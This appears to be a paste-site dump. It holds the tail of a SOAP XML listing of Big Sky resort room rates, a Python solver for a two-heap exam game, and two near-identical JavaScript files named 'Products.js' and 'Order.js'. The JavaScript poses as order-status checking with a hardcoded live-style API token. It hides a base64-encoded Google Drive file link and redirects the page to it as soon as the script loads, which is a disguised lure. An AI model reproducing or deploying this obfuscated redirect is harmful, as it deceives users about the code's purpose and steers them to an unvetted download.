&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U1003P</unittype>
            <unitnumber />
            <unitdescription>4 Bdrm Penthouse</unitdescription>
            <unitpic />
            <firstnite>4989.4500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>12268.0700</unitrate>
            <subtotal>12268.0700</subtotal>
            <extras>0.0000</extras>
            <grats>1226.8100</grats>
            <taxes>1570.3100</taxes>
            <package>12268.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""15065.1900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>T1VC</unittype>
            <unitnumber />
            <unitdescription>Village Center 1 bdr</unitdescription>
            <unitpic />
            <firstnite>708.6200</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1780.0700</unitrate>
            <subtotal>1618.0700</subtotal>
            <extras>162.0000</extras>
            <grats>161.8100</grats>
            <taxes>207.1200</taxes>
            <package>1780.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>162.0000</batchedextras>
            <total amount=""2149.0000"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>OU8512</unittype>
            <unitnumber />
            <unitdescription>Snowcrest 8512</unitdescription>
            <unitpic />
            <firstnite>1318.8700</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>3222.0000</unitrate>
            <subtotal>3222.0000</subtotal>
            <extras>0.0000</extras>
            <grats>322.2000</grats>
            <taxes>412.4100</taxes>
            <package>3222.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""3956.6100"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>OU8513</unittype>
            <unitnumber />
            <unitdescription>Snowcrest 8513</unitdescription>
            <unitpic />
            <firstnite>1546.0500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>3777.0000</unitrate>
            <subtotal>3777.0000</subtotal>
            <extras>0.0000</extras>
            <grats>377.7000</grats>
            <taxes>483.4500</taxes>
            <package>3777.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""4638.1500"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>MUA08S</unittype>
            <unitnumber />
            <unitdescription>Alpine Meadows #8</unitdescription>
            <unitpic />
            <firstnite>1128.5300</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>2757.0000</unitrate>
            <subtotal>2757.0000</subtotal>
            <extras>0.0000</extras>
            <grats>275.7000</grats>
            <taxes>352.8900</taxes>
            <package>2757.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""3385.5900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>MUA11S</unittype>
            <unitnumber />
            <unitdescription>Alpine Meadows #11</unitdescription>
            <unitpic />
            <firstnite>1128.5300</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>2757.0000</unitrate>
            <subtotal>2757.0000</subtotal>
            <extras>0.0000</extras>
            <grats>275.7000</grats>
            <taxes>352.8900</taxes>
            <package>2757.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""3385.5900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>MUH18</unittype>
            <unitnumber />
            <unitdescription>Half Hitch Home-5BR</unitdescription>
            <unitpic />
            <firstnite>3351.2100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>8187.0000</unitrate>
            <subtotal>8187.0000</subtotal>
            <extras>0.0000</extras>
            <grats>818.7000</grats>
            <taxes>1047.9300</taxes>
            <package>8187.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""10053.6300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>OA21B</unittype>
            <unitnumber />
            <unitdescription>Alpenglow #21B</unitdescription>
            <unitpic />
            <firstnite>796.9700</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1907.0000</unitrate>
            <subtotal>1907.0000</subtotal>
            <extras>0.0000</extras>
            <grats>190.7000</grats>
            <taxes>244.0900</taxes>
            <package>1907.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""2341.7900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>OS1732</unittype>
            <unitnumber />
            <unitdescription>Skycrest #1732</unitdescription>
            <unitpic />
            <firstnite>975.0300</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>2382.0000</unitrate>
            <subtotal>2382.0000</subtotal>
            <extras>0.0000</extras>
            <grats>238.2000</grats>
            <taxes>304.8900</taxes>
            <package>2382.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""2925.0900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>OL305C</unittype>
            <unitnumber />
            <unitdescription>Lone Moose #305C</unitdescription>
            <unitpic />
            <firstnite>747.8500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1827.0000</unitrate>
            <subtotal>1827.0000</subtotal>
            <extras>0.0000</extras>
            <grats>182.7000</grats>
            <taxes>233.8500</taxes>
            <package>1827.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""2243.5500"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O1BG</unittype>
            <unitnumber />
            <unitdescription>Big Horn 1 Bedroom</unitdescription>
            <unitpic />
            <firstnite>545.2300</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1332.0000</unitrate>
            <subtotal>1332.0000</subtotal>
            <extras>0.0000</extras>
            <grats>133.2000</grats>
            <taxes>170.4900</taxes>
            <package>1332.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1635.6900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O2BG</unittype>
            <unitnumber />
            <unitdescription>Big Horn 2 Bedroom</unitdescription>
            <unitpic />
            <firstnite>600.4900</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1467.0000</unitrate>
            <subtotal>1467.0000</subtotal>
            <extras>0.0000</extras>
            <grats>146.7000</grats>
            <taxes>187.7700</taxes>
            <package>1467.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1801.4700"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O3BG</unittype>
            <unitnumber />
            <unitdescription>Big Horn 3 Bedroom</unitdescription>
            <unitpic />
            <firstnite>796.9700</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1907.0000</unitrate>
            <subtotal>1907.0000</subtotal>
            <extras>0.0000</extras>
            <grats>190.7000</grats>
            <taxes>244.0900</taxes>
            <package>1907.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""2341.7900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O5PR</unittype>
            <unitnumber />
            <unitdescription>Powder Ridge 5 BR</unitdescription>
            <unitpic />
            <firstnite>2000.4100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>4887.0000</unitrate>
            <subtotal>4887.0000</subtotal>
            <extras>0.0000</extras>
            <grats>488.7000</grats>
            <taxes>625.5300</taxes>
            <package>4887.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""6001.2300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O1SW</unittype>
            <unitnumber />
            <unitdescription>Stillwater 1 Bedroom</unitdescription>
            <unitpic />
            <firstnite>404.0100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>987.0000</unitrate>
            <subtotal>987.0000</subtotal>
            <extras>0.0000</extras>
            <grats>98.7000</grats>
            <taxes>126.3300</taxes>
            <package>987.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1212.0300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O2SL</unittype>
            <unitnumber />
            <unitdescription>Stillwater 1BR Loft</unitdescription>
            <unitpic />
            <firstnite>557.5100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1409.5000</unitrate>
            <subtotal>1409.5000</subtotal>
            <extras>0.0000</extras>
            <grats>140.9600</grats>
            <taxes>180.4100</taxes>
            <package>1409.5000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1730.8700"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>M2SR</unittype>
            <unitnumber />
            <unitdescription>Saddleridge 2 BR</unitdescription>
            <unitpic />
            <firstnite>625.0500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1527.0000</unitrate>
            <subtotal>1527.0000</subtotal>
            <extras>0.0000</extras>
            <grats>152.7000</grats>
            <taxes>195.4500</taxes>
            <package>1527.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1875.1500"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>M3SR</unittype>
            <unitnumber />
            <unitdescription>Saddleridge 2+ BR</unitdescription>
            <unitpic />
            <firstnite>1007.7900</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>2462.0100</unitrate>
            <subtotal>2462.0100</subtotal>
            <extras>0.0000</extras>
            <grats>246.2100</grats>
            <taxes>315.1500</taxes>
            <package>2462.0100</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""3023.3700"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
      </hotelrateresults>
   </soap:Body>
</soap:Envelope>"
cGP6kjjB,Products.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 12:17:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/055/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
djbALa6k,19 две кучи,nq1s788,Python,Wednesday 2nd of April 2025 12:16:36 PM CDT,"#https://kpolyakov.spb.ru/school/ege/gen.php?action=viewVar&answers=on&varId=2
from functools import lru_cache


def moves(h):
    x, y = h
    return (x + 1, y), (x, y + 1), (x * 2, y), (x, y * 2)


@lru_cache(None)
def game(h):
    if sum(h) >= 227:
        return 'win'
    elif any(game(m) == 'win' for m in moves(h)):
        return'p1'
    elif all(game(m) == 'p1' for m in moves(h)):
        return'v1'
    elif any(game(m) == 'v1' for m in moves(h)):
        return'p2'
    elif all(game(m) in ['p1', 'p2'] for m in moves(h)):
        return'v2'


def p19(h):
    return any(game(m) == 'p1' for m in moves(h))


print([s for s in range(1, 210) if p19((17, s))])
print([s for s in range(1, 210) if game((17, s)) == 'p2'])
print([s for s in range(1, 210) if game((17, s)) == 'v2'])"
pTvT3a6h,Order.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 12:01:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/431/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
